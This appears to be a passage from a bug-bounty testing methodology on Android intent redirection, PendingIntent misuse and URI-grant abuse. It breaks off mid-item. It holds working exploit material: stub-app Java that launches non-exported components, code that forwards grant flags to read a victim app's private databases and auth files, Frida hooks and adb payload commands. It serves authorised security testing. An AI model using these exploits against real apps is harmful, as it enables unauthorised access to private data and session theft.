# D08 · Intent Redirection, PendingIntent & URI Grants

> This domain is the confused-deputy layer of Android: you almost never attack the target component
> directly, you make the target app perform the launch, the read or the grant for you with its own UID.
> Its ceiling is genuinely P1 — an unvalidated nested-Intent forward that reaches a session-bearing
> WebView or a private `FileProvider` is an authentication bypass or a token disclosure, not a mobile
> misconfiguration — and Oversecured measured the base class in **over 80% of apps**.

| | |
|---|---|
| **Phases** | P4 static analysis, P5 IPC exercise, P7 impact conversion |
| **Milestones** | M4, M5, M7 |
| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the redirect reaches an authenticated action; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the stolen file yields a token for an internet-facing API; `server_side_injection.remote_code_execution_rce` (P1) for the write→code-load chain. The routine landing zone is `broken_access_control.exposed_sensitive_android_intent` — **priority null, rated entirely on what you demonstrate** |
| **Primary attacker model** | AM-03 zero-permission local app; AM-02 remote one-click for the `parseUri`/`intent://`/deep-link delivery variants; AM-04 for the notification-listener PendingIntent variants |
| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4; MASTG-TEST-0381, MASTG-TEST-0375, MASTG-TEST-0372, MASTG-TEST-0374, MASTG-KNOW-0024, MASTG-KNOW-0117, MASTG-KNOW-0138, MASTG-BEST-0063, rule `mastg-android-pendingintent-mutable`; MASWE-0032, MASWE-0050, MASWE-0029; CWE-926, CWE-927, CWE-940, CWE-269, CWE-20, CWE-345, CWE-502; ATT&CK T1626, T1635, T1635.001, T1409, T1533 |

## Why this domain pays

Three separate bodies buy this class by name. Google's Mobile VRP lists "Intent redirections leading to
launching non-exported application components" and "Vulnerabilities caused by unsafe usage of pending
intents" in its *Additional vulnerability types in scope*; the Android & Google Devices programme buys
"Arbitrary launch of non-exported sensitive activities … or valid bypasses of Intent Redirect hardening".
Google Play has run an App Security Improvement campaign called **Intent Redirection** since 2019-05-16
(`faqs/answer/9267555`) and **Implicit PendingIntent** since 2022-02-22 (`faqs/answer/10437428`) — meaning
Google itself measures the base rate as high enough to warrant a store-wide remediation deadline. On
HackerOne the same shape is #200427 (Slack, **Critical**, nested `extra_deep_link_intent` driving
`CallActivity` to place a real call), #2289836 (MercadoLibre, **High 8.6**, chained to ATO and arbitrary
file read/delete), #1095633 (VK, Critical) and #272044 (Dropbox, $1000).

The base rate is the reason to start here. Oversecured's published figure is **more than 80% of apps**
carry some form of the nested-Intent forward. That is not a claim you can make about any other domain in
this checklist. The corollary is that the *finding* is never the forward — the forward is a primitive.
What separates a P1 from an unrated `exposed_sensitive_android_intent` is which non-exported component you
land on and what comes back across the sandbox boundary. Pick the target component by sink quality, not by
name: a WebView that already carries the session, a `FileProvider` with a `<root-path>`, an admin screen
that performs a state change without re-auth.

The honest caveat is version drift. Android 16 (API 36) hardens nested-Intent launches **by default for
all apps**, and Android 14 made the blank-base mutable `PendingIntent` throw. Neither kills the class — 16
ships an explicit opt-out (`removeLaunchSecurityProtection()`), 14's check is satisfied by
`setPackage(context.packageName)` which leaves the component fillable — but both will be used to close your
report unless you ran the PoC on two API levels yourself and said so in the first paragraph. A redirection
report with no stated platform version is a report the vendor closes for free.

## The crux question

**Does any attacker-reachable entry point in this app hand a `Intent`, `Uri`, `Bundle` or `PendingIntent`
that the attacker fully or partially controls to a framework call that executes with the app's own UID —
and if so, which non-exported component, private provider URI or held runtime permission does that reach
that the attacker cannot reach directly?**

## Triage order

1. **Census the unparcel→launch sinks** (D08-001). Two greps produce the entire candidate set; everything
   else in this chapter is a variant of what those greps return.
2. **Run the two-API-level control** (D08-004) before spending an hour on a PoC that Android 16 blocks.
3. **Classic nested-Intent forward to a non-exported activity** (D08-007). Highest base rate, cheapest
   proof, and the paired `Permission Denial`/success screenshot is what triagers accept.
4. **Attach the grant flags** (D08-010 → D08-012). The grant *is* the payload; you do not need the target
   component to be interesting once the victim is granting you its own `FileProvider`.
5. **`setResult(RESULT_OK, getIntent())`** (D08-033). One grep, and it defeats `exported="false"` on
   providers entirely, plus re-delegates dangerous permissions the victim holds.
6. **`Intent.parseUri` / `intent://` sinks** (D08-022 → D08-026). Same bug, but reachable from a link,
   which moves the attacker model from AM-03 to AM-02 and the severity with it.
7. **Mutable PendingIntent with a blank or package-only base** (D08-037, D08-038). Slower to prove because
   you need an acquisition path, but it is the one class Google buys under its own name.
8. **The apparent-fix bypasses** (D08-013 → D08-018). Test these *after* you find a sanitiser, because a
   present-but-permissive `IntentSanitizer` is worse than none and stops further review.
9. **Parcel/Bundle smuggling** (D08-027 → D08-032). Lowest base rate, highest ceiling, and no manifest
   analysis will find it.
10. **The grant-issuing side** (D08-053 → D08-058). Slowest to reach, but it is where the persistable,
    reboot-surviving exfiltration channel lives.
11. **Discipline items** (D08-062 → D08-066) last, but before you write anything.

## Items

### D08-001 · Census every unparcel-to-launch sink in the app

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASWE-0032 (CWE-927, CWE-940); Google Mobile VRP "Intent redirections leading to launching non-exported application components"; Google's own auditing tip — "Find calls to `startActivity` and verify that Intent components are constructed from trusted data. Find calls `Intent::getExtras` where returned values are cast to Intent" |

- **Test:** Build the complete candidate list before testing anything: every place attacker-controlled
  bytes become an `Intent`, `Uri`, `ComponentName` or `Class`, and every framework sink that then acts on
  it with the app's UID.
- **How:**
  ```bash
  jadx -d out target.apk      # or: jadx -d out --deobf base.apk split_config.*.apk
  # 1. the extractors
  grep -rnE 'getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelable\(|getSerializableExtra\(|Intent\.parseUri\(|Intent\.getIntent\(|Intent\.getIntentOld\(|Parcel\.obtain\(\)|unmarshall\(|readParcelable\(|"android\.intent\.extra\.INTENT"|EXTRA_INTENT' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material)/' > /tmp/d08_extractors.txt
  # 2. the sinks
  grep -rnE 'startActivity\(|startActivityForResult\(|startActivities\(|startService\(|startForegroundService\(|bindService\(|sendBroadcast\(|sendOrderedBroadcast\(|setResult\(|\.send\(' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin)/' > /tmp/d08_sinks.txt
  # 3. the join — same file, close line numbers
  awk -F: '{print $1":"$2}' /tmp/d08_extractors.txt | sort -u | while read -r loc; do
    f=${loc%%:*}; l=${loc##*:}
    grep -n "" "$f" | awk -F: -v L="$l" '$1>=L && $1<=L+12' | grep -qE 'startActivity|startService|bindService|sendBroadcast|setResult|\.send\(' \
      && echo "SINK-REACHABLE $f:$l"
  done | tee /tmp/d08_candidates.txt
  wc -l /tmp/d08_candidates.txt        # count the results — a silent zero here is a failed loop, not a clean app
  ```
  Then cross the file list against the exported set in the **merged** manifest:
  ```bash
  apkanalyzer manifest print target.apk > out/AndroidManifest.merged.xml
  grep -nE 'android:exported="true"|<activity|<service|<receiver|<provider|android:permission=' out/AndroidManifest.merged.xml
  ```
- **Proof:** A table with one row per candidate: file, method, extractor API, sink API, enclosing
  component, exported yes/no, guarding permission. This table is the chapter's worksheet; every later item
  consumes a row of it.
- **Escalation:** Each exported row with no permission is a D08-007 candidate; each non-exported row that a
  deep link reaches is a D08-022 candidate; each `Bundle` forward is D08-030.
- **Ruled out when:** No extractor API appears outside `android/`, `androidx/` and Kotlin stdlib packages
  **and** every `startActivity`/`sendBroadcast` argument in the app's own packages is an `Intent`
  constructed in the same method from a literal class reference. Record the candidate count (zero) and the
  grep commands, not "the scanner found nothing".

### D08-002 · Enable `StrictMode.detectUnsafeIntentLaunch()` and drive the app

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — detector feeding the redirection items |
| **Attacker** | AM-12 (own device instrumentation, not an attack) |
| **Applies to** | device API >= 31; `detectAll()` implies it for apps targeting Android 12 |
| **Maps to** | `guide/components/intents-filters#DetectUnsafeIntentLaunches`; `about/versions/12/behavior-changes-12`; `about/versions/15/behavior-changes-15`; MASTG-TECH-0043; rule `mastg-android-strictmode` |

- **Test:** The platform ships a runtime detector for exactly this class: it fires when the app unparcels a
  nested intent from a delivered intent's extras and immediately launches a component with it. Use it to
  find the sinks your grep missed and to confirm the ones it found.
- **How:** Inject the policy at process start with Frida (works on non-debuggable builds too):
  ```javascript
  // d08_strictmode.js
  Java.perform(function () {
    var B  = Java.use('android.os.StrictMode$VmPolicy$Builder');
    var SM = Java.use('android.os.StrictMode');
    SM.setVmPolicy(B.$new().detectUnsafeIntentLaunch().penaltyLog().build());
    console.log('[+] detectUnsafeIntentLaunch armed');
  });
  ```
  ```bash
  frida -U -f com.target.app -l d08_strictmode.js --no-pause
  adb logcat -c && adb logcat -s StrictMode:* | tee /tmp/d08_strictmode.log
  # platform-side alternative on a debuggable build:
  adb shell am compat enable DETECT_UNSAFE_INTENT_LAUNCH com.target.app
  ```
  Then exercise every exported entry point from D08-001 with `am start`/`am broadcast` and every deep link.
- **Proof:** `StrictMode policy violation: android.os.strictmode.UnsafeIntentLaunchViolation` in logcat,
  with a stack frame naming the forwarding method and class. That frame is the exact line to weaponise.
- **Escalation:** Straight into D08-007 / D08-008. The violation on its own is Low and not reportable —
  report the exploited redirect, cite the violation as corroboration.
- **Ruled out when:** Every exported entry point and every registered deep-link URI has been driven with
  the policy armed and no `UnsafeIntentLaunchViolation` fired, **and** you can show the policy was actually
  installed (the `[+] armed` line plus one deliberately-triggered violation from your own stub as a
  positive control). An absent violation with no positive control proves nothing.

### D08-003 · Frida census of the redirection and PendingIntent surface at runtime

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — instrumentation |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0043; MASTG-TEST-0381 (the hook is the MASTG-TEST-0030 legacy snippet); drozer `parcelable` extra type and `android.intent.extra.INTENT` (verified in `src/drozer/android.py`) |

- **Test:** Static analysis misses reflective launches, SDK code obfuscated past your greps, and
  PendingIntents built by libraries. Hook the framework, not the app.
- **How:**
  ```javascript
  // d08_census.js
  Java.perform(function () {
    var Act = Java.use('android.app.Activity');
    Act.startActivity.overload('android.content.Intent').implementation = function (i) {
      console.log('[startActivity] from ' + this.$className + ' -> ' + i.toString());
      var c = i.getComponent();
      if (c !== null) console.log('    component=' + c.flattenToString());
      console.log('    flags=0x' + (i.getFlags() >>> 0).toString(16) + ' data=' + i.getDataString());
      return this.startActivity(i);
    };
    var I = Java.use('android.content.Intent');
    I.getParcelableExtra.overload('java.lang.String').implementation = function (k) {
      var v = this.getParcelableExtra(k);
      console.log('[getParcelableExtra] key=' + k + ' -> ' + v);
      return v;
    };
    var PI = Java.use('android.app.PendingIntent');
    ['getActivity','getActivities','getService','getForegroundService','getBroadcast'].forEach(function (m) {
      if (!PI[m]) return;
      PI[m].overloads.forEach(function (o) {
        o.implementation = function () {
          var a = [].slice.call(arguments), intent = a[2], flags = a[3];
          var IMMUTABLE = 0x04000000, MUTABLE = 0x02000000, ONESHOT = 0x40000000, UPDATE = 0x08000000;
          console.log('[PendingIntent.' + m + '] rc=' + a[1] +
            ' flags=0x' + (flags >>> 0).toString(16) +
            ' immutable=' + ((flags & IMMUTABLE) !== 0) +
            ' mutable='   + ((flags & MUTABLE)   !== 0) +
            ' oneshot='   + ((flags & ONESHOT)   !== 0) +
            ' update='    + ((flags & UPDATE)    !== 0) +
            ' intent=' + (intent ? intent.toString() : 'null'));
          return o.apply(this, a);
        };
      });
    });
  });
  ```
  ```bash
  frida -U -f com.target.app -l d08_census.js --no-pause | tee /tmp/d08_runtime.log
  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # live PendingIntent records
  ```
- **Proof:** Runtime log lines showing (a) a `startActivity` whose component you supplied, and (b)
  `PendingIntent` creations with `immutable=false` and a base intent whose `toString()` has no `cmp=`.
  Those two lines are the exploitable shapes for D08-007 and D08-037.
- **Escalation:** Feeds every item in this chapter; the flag decode also settles D08-042 and D08-043.
- **Ruled out when:** The app was driven through every screen, deep link and notification with the hooks
  installed, every `PendingIntent.get*` line shows `immutable=true` **and** a `cmp=` in the base intent,
  and no `startActivity` line carries a component sourced from an extra.

### D08-004 · Two-API-level control run before any redirection claim

| | |
|---|---|
| **Severity ceiling** | Support (mandatory method) |
| **VRT** | none — governs the severity narrative of every item below |
| **Attacker** | AM-12 |
| **Applies to** | every nested-intent, `parseUri` and `Parcel.unmarshall` finding |
| **Maps to** | `about/versions/16/behavior-changes-all` — "Android 16 provides default security against general `Intent` redirection attacks…"; `privacy-and-security/risks/intent-redirection` (Android 16 by-default hardening) |

- **Test:** Android 16 applies intent-redirection protection by default to **all** apps regardless of
  target SDK. The identical PoC can pass on API 35 and fail on API 36. If you do not run both, the vendor
  runs one, and it will be the one that closes your report.
- **How:**
  ```bash
  for S in emulator-5554 emulator-5556; do
    echo "== $S sdk=$(adb -s $S shell getprop ro.build.version.sdk)"
    adb -s $S shell am start -n com.target.app/.RedirectActivity \
      --es intent "intent:#Intent;component=com.target.app/.PrivateActivity;end"
    adb -s $S shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
    adb -s $S logcat -d -s ActivityTaskManager PackageManager AndroidRuntime | tail -20
  done
  ```
  Then look for the app disabling the mitigation itself (D08-019).
- **Proof:** A two-row table: `sdk=35 → PrivateActivity resumed`, `sdk=36 → blocked`, with the API-36
  `PackageManager` line (`Intent does not match component's intent filter` or `Access blocked`) quoted.
  Failure *only* on 36 means a platform mitigation, not a fixed application sink — report it as a real
  application finding with the mitigation noted, never as "fixed".
- **Escalation:** If the app calls `removeLaunchSecurityProtection()` the finding stands at full severity on
  every version and the opt-out becomes the lede (D08-019).
- **Ruled out when:** The redirect fails identically on API 35 **and** API 36 with the same
  application-level refusal (a validation exception thrown by the app's own code, visible in the stack
  trace), not a platform block. A platform-only block is never a true negative.

### D08-005 · Sweep the merged manifest for SDK-added exported proxies

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — argue it) |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | all; especially apps embedding wallet, payment, push, ads or analytics SDKs |
| **Maps to** | Microsoft Security Blog 2026-04-09 on EngageLab EngageSDK — vulnerable exported `MTCommonActivity` "automatically added to the merged manifest", vulnerable ≤ 4.5.4, fixed 5.2.1 (2025-11-03), 50M+ installs; Google Play ASI "Intent Redirection" campaign (2019-05-16); MASWE-0032 |

- **Test:** The vulnerable component is frequently not the developer's. Manifest merging pulls activities,
  services and receivers out of dependencies, and the client's own SAST never looked at them. Review the
  **merged** manifest, and scope the redirection grep to non-app packages.
- **How:**
  ```bash
  apkanalyzer manifest print target.apk > merged.xml
  # every exported component whose class is NOT in the app's own package
  grep -nE '<(activity|service|receiver|provider)[^>]*android:name="[^"]*"' merged.xml \
    | grep -v 'com\.target\.app\.' | grep -n 'exported="true"'
  # redirection sinks in SDK code only
  grep -rnE 'getParcelableExtra\("?android\.intent\.extra\.INTENT|startActivity\(\s*\(Intent\)\s*get|startService\(\s*\(Intent\)\s*get|sendBroadcast\(\s*\(Intent\)\s*get|parseUri\(' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material|com/target/app)/'
  # the EngageLab-class signatures specifically
  grep -rn 'n_intent_uri\|processIntent\|processPlatformMessage\|MTCommonActivity' out/sources/
  ```
  Fire each SDK component directly:
  ```bash
  adb shell am start -n com.target.app/<SdkActivity> \
    --es forward_uri "intent:#Intent;component=com.target.app/.InternalOnlyActivity;end"
  ```
- **Proof:** The internal, non-exported activity visibly launches
  (`adb shell dumpsys activity activities | grep -m1 mResumedActivity`) while a direct
  `am start -n com.target.app/.InternalOnlyActivity` returns `SecurityException: Permission Denial`.
  Name the SDK, its version from `META-INF`/`BuildConfig`, and whether a fixed version exists.
- **Escalation:** → D17 supply chain (the fix is a dependency bump, which changes who owns the report);
  → D08-010 if the SDK preserves grant flags. The EngageLab shape ends at persistable R/W on the host's own
  provider, which is Critical.
- **Ruled out when:** Every exported component in the merged manifest resolves to a class in the app's own
  package, or each third-party exported component was fired with a nested/`intent:` payload and rejected it
  (log the rejection). Note: absence of a CVE is not absence of a bug — Microsoft published the EngageLab
  class with no CVE, so do not cite one.

### D08-006 · Census the URI-grant preconditions before testing any grant item

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — precondition inventory for D08-010 through D08-012 and D08-053 through D08-058 |
| **Attacker** | AM-03 |
| **Applies to** | all; `<provider>` default for `android:grantUriPermissions` is `"false"` |
| **Maps to** | MASTG-KNOW-0117 ("`android:grantUriPermissions`: allows temporary, URI-scoped access grants"); MASTG-TEST-0250 Note 2 — grants let other apps access URIs "even though restrictions such as `permission` attributes, or `android:exported=\"false\"` are set"; MASTG-TEST-0357; rule `mastg-android-fileprovider-broad-scope`; drozer `app.provider.info` `Grant Uri Permissions:` field |

- **Test:** A redirect that carries grant flags only pays if there is something worth granting. Enumerate
  which authorities are grantable and how wide their path scope is, so you know which URI to aim the
  redirect at before you build the PoC.
- **How:**
  ```bash
  grep -nE '<provider' -A12 out/AndroidManifest.merged.xml | grep -nE 'authorities|exported|grantUriPermissions|<grant-uri-permission|android:permission'
  grep -n 'grantUriPermissions="true"' out/AndroidManifest.merged.xml
  xmlstarlet sel -t -m "//provider/grant-uri-permission" \
    -v "@android:pathPattern" -o " | prefix=" -v "@android:pathPrefix" -o " | path=" -v "@android:path" -n out/AndroidManifest.merged.xml
  # FileProvider path scope — <root-path path="."/> maps the whole visible filesystem
  grep -rn 'android.support.FILE_PROVIDER_PATHS\|androidx.core.content.FileProvider' out/AndroidManifest.merged.xml
  cat out/res/xml/*path*.xml out/res/xml/*provider*.xml 2>/dev/null
  ```
  ```
  dz> run app.provider.info -a com.target.app -v      # "Grant Uri Permissions: true"
  ```
- **Proof:** A table of authority → exported? → grantUriPermissions? → path scope → what lives under that
  scope. A row reading `com.target.app.fileprovider | exported=false | grant=true | <root-path path="."/>`
  is the single most valuable line in the engagement: the redirect target is chosen for you.
- **Escalation:** → D07 for the provider's own defects; the grant items in this chapter are the delivery
  mechanism that makes a non-exported provider reachable.
- **Ruled out when:** No provider in the merged manifest sets `android:grantUriPermissions="true"` and none
  declares `<grant-uri-permission>` children — in which case a forwarded grant flag has nothing to bind to
  and D08-010 through D08-012 are true negatives with a stated mechanism. Note `FileProvider` requires the
  attribute by definition (MASTG-TEST-0250), so its presence there is not itself the defect — the path
  scope is.

### D08-007 · Classic nested-Intent forward to a non-exported activity

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — argue up to `broken_authentication_and_session_management.authentication_bypass` (P1) when the reached component performs an authenticated action |
| **Attacker** | AM-03 |
| **Applies to** | all; Android 16 hardens by default (run D08-004) |
| **Maps to** | `privacy-and-security/risks/intent-redirection` — impact per the page: "Execute internal features in the vulnerable app" and "Access private components like unexported ContentProvider objects"; MASWE-0032 (CWE-927, CWE-940); CWE-926; H1 #200427 (Slack, Critical), #2289836 (MercadoLibre, High 8.6), #1095633 (VK), #951691; EDB 38170 (Facebook for Android 1.8.1, `LoginActivity` → `FacebookWebViewActivity`); Ostorlab KB `INTENT_REDIRECTION` (MASVS_CODE_4, MSTG_PLATFORM_2, M4 2024) |

- **Test:** An exported component pulls an `Intent` out of its own extras and passes it to
  `startActivity()`. `Intent` is `Parcelable`, so you nest an Intent naming a **non-exported** component
  and the app launches it with its own identity. Slack's code, verbatim from #200427:
  ```java
  protected void onResume() { handleIntentExtras(getIntent()); }
  private void handleIntentExtras(Intent intent) {
      Intent deeplinkIntent = (Intent) intent.getParcelableExtra("extra_deep_link_intent");
      if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {
          startActivity(deeplinkIntent);              // attacker-controlled
      }
  }
  ```
- **How:** The nested Parcelable cannot be carried by `am --es`, so build a stub APK (manifest declaring
  **only** `INTERNET`):
  ```java
  Intent inner = new Intent();
  inner.setClassName("com.target.app", "com.target.app.internal.NonExportedActivity");
  inner.putExtra("url", "https://attacker.example/");     // whatever the target consumes
  Intent outer = new Intent();
  outer.setClassName("com.target.app", "com.target.app.ExportedProxyActivity");
  outer.putExtra("extra_intent", inner);                  // key from D08-001
  startActivity(outer);
  ```
  Key names worth trying first, all seen in real apps:
  ```bash
  grep -rnE '"(extra_intent|extra_deep_link_intent|intent|forward|forward_intent|redirect|redirect_intent|referrerActivity|next|nextIntent|target|continuation_intent|android\.intent\.extra\.INTENT)"' out/sources/
  ```
- **Proof:** The paired failure/success, which is the only proof triagers accept:
  ```bash
  adb shell am start -n com.target.app/.internal.NonExportedActivity
  # SecurityException: Permission Denial: ... not exported from uid ...
  adb shell am start -n com.attacker.poc/.Go          # fires the nested payload
  adb shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
  # → com.target.app/.internal.NonExportedActivity
  ```
  Plus a screenshot of the internal screen rendering with your data.
- **Escalation:** Pick the reached component by sink quality — a session-bearing WebView (→ D10), a file
  handler (→ D11), or a state-changing action. Slack's report escalated from "a screen appears" to placing
  a real phone call via `CallActivity` with `EXTRA_CALLER_ID`/`EXTRA_USERS_TO_INVITE`, which is why it rated
  Critical. Then attach grant flags (D08-010).
- **Ruled out when:** Every `getParcelableExtra`-sourced `Intent` is passed through a component allow-list
  that is checked **after** `setComponent`/`setSelector`/`setPackage` normalisation, or is never reached by
  a sink, or its enclosing component is `exported="false"` with no deep link, `PendingIntent` or other
  redirect reaching it. State which of those three applies, per candidate row from D08-001.

### D08-008 · The same forward through service, foreground-service and broadcast sinks

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; implicit **service** binding has been illegal since Android 5, so an implicit `bindService` is both a crash and a LEGACY pattern |
| **Maps to** | MASWE-0032; ATT&CK T1624.001 Broadcast Receivers; CVE-2023-44121 (LG ThinQ, exported receiver action `com.lge.lms.things.notification.ACTION`) |

- **Test:** Reviewers stop at `startActivity`. The same unparcel-and-launch shape in `startService`,
  `startForegroundService`, `bindService` and `sendBroadcast` is usually unreviewed, and a
  broadcast/service sink launches with no visible UI — which removes the "the user would notice" objection.
- **How:**
  ```bash
  grep -rnE 'getParcelableExtra\(' out/sources/ -A8 | grep -nE 'startService|startForegroundService|bindService|sendBroadcast|sendOrderedBroadcast|sendBroadcastAsUser'
  ```
  ```bash
  adb shell am startservice -n com.target.app/.ExportedService \
    --es redirect_intent 'intent:#Intent;component=com.target.app/.PrivService;action=com.target.DO;end'
  adb shell am broadcast -n com.target.app/.RelayReceiver -a com.target.RELAY \
    --es forwarded 'intent:#Intent;component=com.target.app/.HiddenActivity;S.extra=1;end'
  ```
  For a true nested Parcelable use the stub app as in D08-007 with `startService`/`sendBroadcast` on the
  outer intent.
- **Proof:** The private service's log line or side effect fires (Frida hook on its `onStartCommand`
  printing `intent.getExtras().keySet()`), or `dumpsys activity services com.target.app` shows it started,
  while a direct `am startservice -n com.target.app/.PrivService` is refused.
- **Escalation:** A broadcast sink reaching an `onReceive` that writes to storage is a D17 precondition; a
  service sink that performs a backend call is D15 acting as the victim.
- **Ruled out when:** No `getParcelableExtra`/`parseUri` result reaches a service or broadcast sink, or the
  enclosing service declares a signature-level `android:permission` and `onBind`/`onStartCommand`
  additionally checks `Binder.getCallingUid()` against `PackageManager.getPackagesForUid()` plus a
  signature comparison.

### D08-009 · Literal `startActivity(getIntent())` self-forward

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASWE-0032 (CWE-927); Oversecured "Android: Access to app protected components" — remediation line "Developers should never redirect Intents in full" |

- **Test:** The degenerate case that greps for `getParcelableExtra` miss entirely: the component forwards
  the **whole received Intent**, not an extra of it. Every field — component, selector, data, flags, extras
  — is attacker-controlled in one shot.
- **How:**
  ```bash
  grep -rnE 'startActivity\(\s*getIntent\(\)\s*\)|startService\(\s*getIntent\(\)\s*\)|sendBroadcast\(\s*getIntent\(\)\s*\)|startActivity\(\s*intent\s*\)' out/sources/ -B6
  # and the near-miss: a copy that keeps the flags
  grep -rnE 'new Intent\(\s*getIntent\(\)\s*\)|Intent\(\s*intent\s*\)' out/sources/ -A6
  ```
  Note `new Intent(Intent o)` is a **copy constructor** that preserves flags, data, selector and extras —
  a "we rebuild the intent" defence that rebuilds nothing.
- **Proof:** From the stub, call the component with `setSelector()` pointing at a non-exported activity and
  `FLAG_GRANT_READ_URI_PERMISSION` set; both survive the forward. `dumpsys activity activities` names the
  selector target.
- **Escalation:** This single shape gives you D08-010, D08-015 and D08-021 simultaneously — carry all three
  payloads in one PoC.
- **Ruled out when:** No `startActivity(getIntent())` or copy-constructor forward exists, or the forwarded
  intent is rebuilt field-by-field from an allow-list (`new Intent()` plus explicit `setClassName` and
  explicitly copied, named extras) with `setSelector(null)` and `removeFlags(FLAG_GRANT_*)` applied.

### D08-010 · Forwarded `FLAG_GRANT_READ/WRITE_URI_PERMISSION` — the grant is the payload

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields a token for an internet-facing API; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; precondition is a provider with `android:grantUriPermissions="true"` or a `<grant-uri-permission>` child (D08-006) |
| **Maps to** | `risks/intent-redirection` — the mitigation list names exactly the four flags to strip: `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION`, `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, `FLAG_GRANT_PREFIX_URI_PERMISSION`; MASTG-TEST-0250 Note 2; MASTG-KNOW-0117; drozer flag map `GRANT_READ_URI_PERMISSION 0x00000001`, `GRANT_WRITE_URI_PERMISSION 0x00000002`; H1 #272044 (Dropbox, $1000); Oversecured "Android: Access to app protected components" §2–3 |

- **Test:** The reached component does not have to be interesting. Point the nested intent at **your own**
  activity, set the data URI to the victim's own non-exported provider, and set the grant flags: the victim
  becomes the granter and `exported="false"` is irrelevant, because the grant is computed against the
  starter's UID, not yours.
- **How:** In the stub app:
  ```java
  Intent inner = new Intent(Intent.ACTION_VIEW);
  inner.setClassName("com.attacker.poc", "com.attacker.poc.LeakActivity");
  inner.setData(Uri.parse(
      "content://com.target.app.fileprovider/root/data/data/com.target.app/databases/secret.db"));
  inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  Intent outer = new Intent();
  outer.setClassName("com.target.app", "com.target.app.ExportedProxyActivity");
  outer.putExtra("extra_intent", inner);
  startActivity(outer);
  ```
  In `LeakActivity.onCreate`:
  ```java
  try (InputStream in = getContentResolver().openInputStream(getIntent().getData())) {
      byte[] b = new byte[16]; in.read(b);
      Log.i("D08", "magic=" + new String(b, 0, 15));   // "SQLite format 3"
  }
  ```
  From the shell, the flag-only variant against a forwarder that takes a data URI directly:
  ```bash
  adb shell am start -n com.target.app/.Forwarder -f 0x00000003 \
    --eu android.intent.extra.STREAM \
    content://com.target.app.fileprovider/root/data/data/com.target.app/databases/app.db
  # 0x3 = FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION
  adb shell dumpsys activity permissions | sed -n '/Granted Uri Permissions/,/^$/p'
  ```
- **Proof:** Your process printing `SQLite format 3` (or the real rows) from an authority declared
  `android:exported="false"`, plus `dumpsys activity permissions` listing the grant held by
  `com.attacker.poc`. The negative control — the identical `openInputStream` without the redirect —
  must throw `SecurityException`.
- **Escalation:** → D07 for what the provider exposes; write access → D17 (overwrite a config, a `.dex`,
  or a native library the app later loads → code execution as the victim). Oversecured's Google-app chain
  is exactly this: redirect → provider write → dynamic code load → RCE.
- **Ruled out when:** The forwarding path calls `removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | …)`
  or rebuilds a fresh Intent before launching **and** D08-006 found no grantable authority. A provider set
  `exported="false"` with `grantUriPermissions="false"` and no `<grant-uri-permission>` child cannot be
  reached this way — that is the mechanism, state it.

### D08-011 · `FLAG_GRANT_PREFIX_URI_PERMISSION` — one file becomes the whole authority

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if a token is under the prefix |
| **Attacker** | AM-03 |
| **Applies to** | all; requires the same grant precondition as D08-010 |
| **Maps to** | `risks/intent-redirection` flag-sanitisation list; MASTG-KNOW-0117 |

- **Test:** Testers set `FLAG_GRANT_READ_URI_PERMISSION` and stop. `FLAG_GRANT_PREFIX_URI_PERMISSION`
  converts the grant from "this exact URI" to "everything under this path", which turns a single-file read
  into an authority-wide dump. Always test it as a separate payload — some forwarders strip READ/WRITE by
  name and leave PREFIX and PERSISTABLE in place.
- **How:** Same nested intent as D08-010, but aim at a directory and add the prefix flag:
  ```java
  inner.setData(Uri.parse("content://com.target.app.fileprovider/root/data/data/com.target.app/"));
  inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
               | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
  ```
  Then walk the tree from the attacker process:
  ```java
  for (String p : new String[]{"shared_prefs/auth.xml","databases/app.db","files/session_backup_payload"}) {
      Uri u = Uri.withAppendedPath(base, p);
      try (InputStream in = getContentResolver().openInputStream(u)) { /* log length */ }
      catch (Exception e) { Log.i("D08", p + " -> " + e); }
  }
  ```
- **Proof:** Two or more distinct files under the same authority read in one session from a single granted
